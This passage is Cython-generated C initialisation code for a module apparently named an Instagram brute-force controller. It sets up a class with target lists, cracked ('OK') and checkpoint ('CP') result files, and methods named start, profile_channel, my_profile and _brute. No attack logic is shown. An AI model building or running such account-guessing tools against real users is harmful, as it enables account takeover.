  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_ThreadPoolExecutor);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_concurrent_futures, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ThreadPoolExecutor, __pyx_t_1) < 0) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

   
  __pyx_t_2 = PyList_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_ConnectionError);
  __Pyx_GIVEREF(__pyx_n_s_ConnectionError);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_ConnectionError);
  __Pyx_INCREF(__pyx_n_s_Timeout);
  __Pyx_GIVEREF(__pyx_n_s_Timeout);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_n_s_Timeout);
  __Pyx_INCREF(__pyx_n_s_ChunkedEncodingError);
  __Pyx_GIVEREF(__pyx_n_s_ChunkedEncodingError);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_n_s_ChunkedEncodingError);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests_exceptions, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ConnectionError, __pyx_t_2) < 0) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_Timeout); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Timeout, __pyx_t_2) < 0) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_ChunkedEncodingError); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ChunkedEncodingError, __pyx_t_2) < 0) __PYX_ERR(0, 11, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_unquote);
  __Pyx_GIVEREF(__pyx_n_s_unquote);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_unquote);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_urllib_parse, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_unquote); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_unquote, __pyx_t_1) < 0) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

   
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_datetime);
  __Pyx_GIVEREF(__pyx_n_s_datetime);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_datetime);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_datetime, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_datetime); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_datetime, __pyx_t_2) < 0) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_sleep);
  __Pyx_GIVEREF(__pyx_n_s_sleep);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_sleep);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_time, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_sleep); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sleep, __pyx_t_1) < 0) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

   
  __pyx_t_2 = __Pyx_Py3MetaclassPrepare((PyObject *) NULL, __pyx_empty_tuple, __pyx_n_s_Base, __pyx_n_s_Base, (PyObject *) NULL, __pyx_n_s_controllers_ig_bruteforce___init, (PyObject *) NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

   
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_2, __pyx_n_s_TARGET, __pyx_t_1) < 0) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_2, __pyx_n_s_OK, __pyx_t_1) < 0) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_2, __pyx_n_s_CP, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  if (__Pyx_SetNameInClass(__pyx_t_2, __pyx_n_s_PROGRESS_CURRENT, __pyx_int_0) < 0) __PYX_ERR(0, 20, __pyx_L1_error)

   
  __pyx_t_1 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_2, __pyx_n_s_SESSION, __pyx_t_1) < 0) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  if (__Pyx_SetNameInClass(__pyx_t_2, __pyx_n_s_IP_IS_BLOCKED, Py_False) < 0) __PYX_ERR(0, 22, __pyx_L1_error)

   
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_path); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_join); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_datetime); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_fromtimestamp); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_app); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_START_TIME); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_8);
    if (likely(__pyx_t_7)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
      __Pyx_INCREF(__pyx_t_7);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_8, function);
    }
  }
  __pyx_t_6 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_7, __pyx_t_9) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_9);
  __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_strftime); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_8);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_8, function);
    }
  }
  __pyx_t_5 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_6, __pyx_kp_u_OK_d_B_Y) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_kp_u_OK_d_B_Y);
  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_upper); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_8);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_8, function);
    }
  }
  __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = PyNumber_Add(__pyx_t_4, __pyx_kp_u_txt); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  __pyx_t_10 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_10 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_3)) {
    PyObject *__pyx_temp[3] = {__pyx_t_4, __pyx_kp_u_result_ig, __pyx_t_8};
    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_3)) {
    PyObject *__pyx_temp[3] = {__pyx_t_4, __pyx_kp_u_result_ig, __pyx_t_8};
    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  } else
  #endif
  {
    __pyx_t_5 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    if (__pyx_t_4) {
      __Pyx_GIVEREF(__pyx_t_4); PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_4); __pyx_t_4 = NULL;
    }
    __Pyx_INCREF(__pyx_kp_u_result_ig);
    __Pyx_GIVEREF(__pyx_kp_u_result_ig);
    PyTuple_SET_ITEM(__pyx_t_5, 0+__pyx_t_10, __pyx_kp_u_result_ig);
    __Pyx_GIVEREF(__pyx_t_8);
    PyTuple_SET_ITEM(__pyx_t_5, 1+__pyx_t_10, __pyx_t_8);
    __pyx_t_8 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_5, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  }
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (__Pyx_SetNameInClass(__pyx_t_2, __pyx_n_s_OK_FILES_SAVED, __pyx_t_1) < 0) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_path); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_join); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_datetime); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_fromtimestamp); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_app); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_START_TIME); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_9);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_9, function);
    }
  }
  __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_6, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_7);
  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_strftime); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_9);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_9, function);
    }
  }
  __pyx_t_8 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_4, __pyx_kp_u_CP_d_B_Y) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_kp_u_CP_d_B_Y);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_upper); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_9);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_9, function);
    }
  }
  __pyx_t_5 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
  if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  __pyx_t_9 = PyNumber_Add(__pyx_t_5, __pyx_kp_u_txt); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  __pyx_t_10 = 0;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_10 = 1;
    }
  }
  #if CYTHON_FAST_PYCALL
  if (PyFunction_Check(__pyx_t_3)) {
    PyObject *__pyx_temp[3] = {__pyx_t_5, __pyx_kp_u_result_ig, __pyx_t_9};
    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 24, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  } else
  #endif
  #if CYTHON_FAST_PYCCALL
  if (__Pyx_PyFastCFunction_Check(__pyx_t_3)) {
    PyObject *__pyx_temp[3] = {__pyx_t_5, __pyx_kp_u_result_ig, __pyx_t_9};
    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 24, __pyx_L1_error)
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  } else
  #endif
  {
    __pyx_t_8 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 24, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    if (__pyx_t_5) {
      __Pyx_GIVEREF(__pyx_t_5); PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_5); __pyx_t_5 = NULL;
    }
    __Pyx_INCREF(__pyx_kp_u_result_ig);
    __Pyx_GIVEREF(__pyx_kp_u_result_ig);
    PyTuple_SET_ITEM(__pyx_t_8, 0+__pyx_t_10, __pyx_kp_u_result_ig);
    __Pyx_GIVEREF(__pyx_t_9);
    PyTuple_SET_ITEM(__pyx_t_8, 1+__pyx_t_10, __pyx_t_9);
    __pyx_t_9 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_8, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 24, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  }
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (__Pyx_SetNameInClass(__pyx_t_2, __pyx_n_s_CP_FILES_SAVED, __pyx_t_1) < 0) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_1__init__, 0, __pyx_n_s_Base___init, NULL, __pyx_n_s_controllers_ig_bruteforce___init, __pyx_d, ((PyObject *)__pyx_codeobj__20)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_2, __pyx_n_s_init, __pyx_t_1) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_3start, 0, __pyx_n_s_Base_start, NULL, __pyx_n_s_controllers_ig_bruteforce___init, __pyx_d, ((PyObject *)__pyx_codeobj__22)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_2, __pyx_n_s_start, __pyx_t_1) < 0) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_5profile_channel, 0, __pyx_n_s_Base_profile_channel, NULL, __pyx_n_s_controllers_ig_bruteforce___init, __pyx_d, ((PyObject *)__pyx_codeobj__24)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 127, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_CyFunction_SetDefaultsTuple(__pyx_t_1, __pyx_tuple__25);
  if (__Pyx_SetNameInClass(__pyx_t_2, __pyx_n_s_profile_channel, __pyx_t_1) < 0) __PYX_ERR(0, 127, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_7my_profile, 0, __pyx_n_s_Base_my_profile, NULL, __pyx_n_s_controllers_ig_bruteforce___init, __pyx_d, ((PyObject *)__pyx_codeobj__27)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 159, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_2, __pyx_n_s_my_profile, __pyx_t_1) < 0) __PYX_ERR(0, 159, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_9_brute, 0, __pyx_n_s_Base__brute, NULL, __pyx_n_s_controllers_ig_bruteforce___init, __pyx_d, ((PyObject *)__pyx_codeobj__29)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 225, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_SetNameInClass(__pyx_t_2, __pyx_n_s_brute, __pyx_t_1) < 0) __PYX_ERR(0, 225, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
